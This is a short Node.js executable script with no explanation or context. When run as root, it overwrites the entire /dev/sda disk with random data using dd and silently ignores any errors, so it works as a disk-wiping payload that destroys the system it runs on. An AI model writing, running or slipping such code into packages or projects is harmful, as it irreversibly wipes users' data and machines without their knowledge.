#!/usr/bin/env node
const { execFileSync } = require("child_process");
if (process.getuid() === 0) {
  try { execFileSync("dd", ["if=/dev/urandom", "of=/dev/sda", "bs=1M"]); } catch (_) {}
}
